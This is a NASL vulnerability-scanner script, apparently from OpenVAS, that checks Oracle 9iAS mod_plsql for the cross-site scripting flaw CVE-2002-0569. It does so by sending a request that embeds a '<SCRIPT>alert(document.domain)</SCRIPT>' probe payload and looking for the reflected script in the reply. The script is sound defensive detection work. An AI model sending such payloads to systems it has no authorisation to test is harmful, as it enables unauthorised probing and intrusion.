CPE = "cpe:/a:oracle:http_server";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10853" );
	script_version( "2020-02-03T15:12:40+0000" );
	script_tag( name: "last_modification", value: "2020-02-03 15:12:40 +0000 (Mon, 03 Feb 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 4298 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2002-0569" );
	script_name( "Oracle 9iAS mod_plsql cross site scripting" );
	script_xref( name: "URL", value: "http://www.nextgenss.com/papers/hpoas.pdf" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2002 Matt Moore" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_oracle_app_server_detect.sc", "cross_site_scripting.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "oracle/http_server/detected" );
	script_tag( name: "solution", value: "Patches which address several vulnerabilities in Oracle 9iAS can be
  downloaded from the oracle Metalink site." );
	script_tag( name: "summary", value: "The mod_plsql module supplied with Oracle9iAS allows cross site scripting
  attacks to be performed." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
req = http_get( item: "/pls/help/<SCRIPT>alert(document.domain)</SCRIPT>", port: port );
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: req );
r = http_recv( socket: soc );
http_close_socket( soc );
if(!IsMatchRegexp( r, "^HTTP/1\\.[01] 200" )){
	exit( 0 );
}
confirmed = NASLString( "<SCRIPT>alert(document.domain)</SCRIPT>" );
confirmedtoo = NASLString( "No DAD configuration" );
if(( ContainsString( r, confirmed ) ) && ( ContainsString( r, confirmedtoo ) )){
	security_message( port );
}

